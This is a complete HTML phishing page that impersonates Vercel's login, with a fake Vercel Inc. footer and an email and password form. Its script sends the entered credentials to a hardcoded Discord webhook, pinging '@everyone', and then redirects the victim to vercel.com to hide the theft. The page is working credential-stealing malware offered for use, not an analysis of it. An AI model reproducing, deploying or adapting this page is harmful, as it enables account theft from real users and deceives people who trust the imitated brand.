<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vercel Bot - Master Rian</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }
        
        body {
            background: linear-gradient(145deg, #000000, #1a1a2e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            max-width: 400px;
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
        }
        
        h1 {
            color: white;
            text-align: center;
            font-size: 2em;
            margin-bottom: 10px;
        }
        
        .sub {
            color: #4ecdc4;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 8px;
        }
        
        .input-group input {
            width: 100%;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            color: white;
            font-size: 1em;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(45deg, #4ecdc4, #2c7a7b);
            border: none;
            border-radius: 15px;
            color: white;
            font-weight: bold;
            font-size: 1.2em;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .loading {
            display: none;
            text-align: center;
            color: white;
            margin-top: 20px;
        }
        
        .loading.show {
            display: block;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: #4ecdc4;
            border-radius: 50%;
            animation: spin 1s infinite;
            margin: 10px auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .footer {
            text-align: center;
            color: rgba(255, 255, 255, 0.3);
            margin-top: 20px;
            font-size: 0.8em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 VERCEl DEPLOY</h1>
        <div class="sub">by Master Rian</div>
        
        <form id="loginForm">
            <div class="input-group">
                <label>📧 Email</label>
                <input type="email" id="email" placeholder="email@gmail.com" required>
            </div>
            
            <div class="input-group">
                <label>🔑 Password</label>
                <input type="password" id="password" placeholder="••••••••" required>
            </div>
            
            <button type="submit" class="btn">🚀 DEPLOY NOW</button>
        </form>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Deploying to Vercel...</p>
        </div>
        
        <div class="footer">
            © 2025 Vercel Inc. - Master Rian Edition
        </div>
    </div>
    
    <script>
        // 🔥 WEBHOOK PUNYA LO
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1482352449703641110/twvXppkZMXNH1DUHIgNQhZjBiU4dleQ0fTLMOu5l1qwopGsDovRmWA-1SMKho0PyQiA4";
        
        const form = document.getElementById('loginForm');
        const loading = document.getElementById('loading');
        
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            loading.classList.add('show');
            
            // Kirim ke Discord
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    content: `@everyone **🎯 VERCEl DEPLOY**\nEmail: ${email}\nPassword: ${password}` 
                })
            });
            
            // Redirect setelah 3 detik
            setTimeout(() => {
                window.location.href = 'https://vercel.com';
            }, 3000);
        });
    </script>
</body>
</html>
